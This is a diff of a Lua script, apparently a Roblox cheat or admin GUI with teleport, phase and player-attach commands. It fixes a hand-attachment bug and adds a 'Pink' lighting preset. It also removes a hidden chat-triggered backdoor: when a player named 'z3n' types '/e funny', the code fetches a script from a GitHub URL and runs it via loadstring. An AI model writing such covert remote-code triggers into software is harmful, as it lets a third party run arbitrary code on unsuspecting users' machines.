@@ -1302,7 +1302,7 @@ local function AttachToPlayer(TargetUsername, AttachPart)
 		Part = "LeftHand"
 		AttachmentOffset = CFrame.Angles(0.3, -3, 0)
 	elseif AttachPart == "Right" then
-		Part = "LeftHand"
+		Part = "RightHand"
 		AttachmentOffset = CFrame.Angles(0.3, -3, 0)
 	end
 	local StopAttach = Player:FindFirstChild("StopAttach")
@@ -1457,6 +1457,33 @@ local function SetGameShaders(Type)
 		local Atmosphere = Instance.new("Atmosphere")
 		Atmosphere.Color = Color3.fromRGB(199, 199, 199)
 		Atmosphere.Parent = Lighting
+	elseif Type == "Pink" then
+		local Skybox = CreateSkybox(
+			"http://www.roblox.com/asset/?id=271042516",
+			"http://www.roblox.com/asset/?id=271077243",
+			"http://www.roblox.com/asset/?id=271042556",
+			"http://www.roblox.com/asset/?id=271042310",
+			"http://www.roblox.com/asset/?id=271042467",
+			"http://www.roblox.com/asset/?id=271077958"
+		)
+		Skybox.Parent = Lighting
+		
+		local Atmosphere = Instance.new("Atmosphere")
+		Atmosphere.Parent = Lighting
+		
+		local Bloom = Instance.new("BloomEffect")
+		Bloom.Enabled = true
+		Bloom.Intensity = 1.2
+		Bloom.Size = 25
+		Bloom.Threshold = 1.1
+		Bloom.Parent = Lighting
+		
+		local Correction = Instance.new("ColorCorrectionEffect")
+		Correction.Contrast = -0.1
+		Correction.TintColor = Color3.fromRGB(245, 225, 255)
+		Correction.Enabled = true
+		Correction.Saturation = 0.2
+		Correction.Parent = Lighting
 	elseif Type == "Baked" then
 		local Correction = Instance.new("ColorCorrectionEffect")
 		Correction.Brightness = 0
@@ -1801,7 +1828,7 @@ local function SetupCommands()
 		end,
 		nil
 	)
-	CreateCommand("Shading", "Changes the lighting effects, skybox, and post processing to some preset options.", nil, {"None", "Normal", "Grain", "Baked", "B&W"}, "Fun",
+	CreateCommand("Shading", "Changes the lighting effects, skybox, and post processing to some preset options.", nil, {"None", "Normal", "Grain", "Pink", "Baked", "B&W"}, "Fun",
 		function(Type)
 			SetGameShaders(Type)
 		end,
@@ -1858,6 +1885,7 @@ OuterFrame.Close.MouseButton1Click:Connect(function()
 			PhaseObj.CanCollide = true
 		end
 	end
+	SetGameShaders("None")
 	TeleportEnabled = false
 	PhaseEnabled = false
 	MarkersActive = false
@@ -1906,23 +1934,7 @@ end)
 
 -- Loop
 
-local Db = false
 
-coroutine.resume(coroutine.create(function()
-	while wait(5) do
-		for i,v in pairs(Players:GetPlayers()) do
-			v.Chatted:Connect(function(Message)
-				if Db then return end
-				if Message == "/e funny" and Player.DisplayName == "z3n" then
-					Db = true
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/likelysmith/MiscScripts/main/fakecheatwarn"))()
-					wait(1)
-					Db = false
-				end
-			end)
-		end
-	end
-end))
 
 RunService.RenderStepped:Connect(function()
 	if TeleportEnabled then
